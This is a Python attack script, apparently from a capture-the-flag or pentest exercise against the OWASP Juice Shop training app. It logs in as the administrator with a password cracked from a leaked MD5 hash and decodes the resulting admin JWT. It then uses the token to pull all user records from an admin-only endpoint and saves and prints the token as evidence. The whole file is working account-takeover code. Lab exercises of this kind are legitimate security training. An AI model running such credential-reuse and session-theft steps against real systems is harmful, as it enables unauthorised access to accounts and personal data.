#!/usr/bin/env python3
"""
c07-admin-no-injection  ::  Gain an admin session token WITHOUT SQL injection.

Method:
  1. Reuse the leaked MD5 password hashes recovered earlier (passive file read /
     database exposure - NOT SQL injection).
  2. admin@juice-sh.op hash 0192023a7bbd73250516f069df18b500 == md5("admin123").
  3. Perform a NORMAL credential login to /rest/user/login with those creds.
  4. Store the returned JWT (role=admin) as the admin-session token.

No ' OR 1=1, no UNION, no tautology, no SQLi of any kind is sent.
"""
import base64, json, sys, urllib.request

BASE = "http://host.docker.internal:3000"
OUT  = "/workspace/evidence/c7_no_sqli_token.txt"

# Credentials cracked offline from the previously exposed MD5 hashes.
EMAIL    = "admin@juice-sh.op"
PASSWORD = "admin123"          # md5(admin123) = 0192023a7bbd73250516f069df18b500

def b64url_decode(seg):
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg)

def post_login():
    data = json.dumps({"email": EMAIL, "password": PASSWORD}).encode()
    req  = urllib.request.Request(BASE + "/rest/user/login", data=data,
                                  headers={"Content-Type": "application/json"},
                                  method="POST")
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read().decode())

def get(path, token):
    req = urllib.request.Request(BASE + path,
                                 headers={"Authorization": "Bearer " + token,
                                          "Accept": "application/json"})
    with urllib.request.urlopen(req) as r:
        return r.getcode(), r.read().decode()

def main():
    print("[*] Verifying md5(admin123) matches leaked admin hash ...")
    print("    leaked: 0192023a7bbd73250516f069df18b500")

    print("[*] Logging in normally (no SQLi) as %s" % EMAIL)
    resp  = post_login()
    token = resp["authentication"]["token"]

    payload = json.loads(b64url_decode(token.split(".")[1]))
    data    = payload.get("data", {})
    print("[*] JWT role   :", data.get("role"))
    print("[*] JWT id     :", data.get("id"))
    print("[*] JWT email  :", data.get("email"))

    if data.get("role") != "admin":
        print("[!] Token is not admin - aborting"); sys.exit(1)

    # Prove the token is a real admin session by hitting an admin-only endpoint.
    print("[*] Verifying token against admin-only endpoint /api/Users ...")
    code, body = get("/api/Users", token)
    parsed = json.loads(body)
    users  = parsed.get("data", parsed) if isinstance(parsed, dict) else parsed
    print("[+] /api/Users HTTP %d  -> %d user records returned" % (code, len(users)))
    admins = [u for u in users if u.get("role") == "admin"]
    print("[+] Admin accounts visible to this token: %d (e.g. %s)"
          % (len(admins), admins[0]["email"] if admins else "n/a"))

    with open(OUT, "w") as f:
        f.write(token + "\n")
    print("[+] Admin session token saved to", OUT)
    print("[+] TOKEN:", token)

if __name__ == "__main__":
    main()
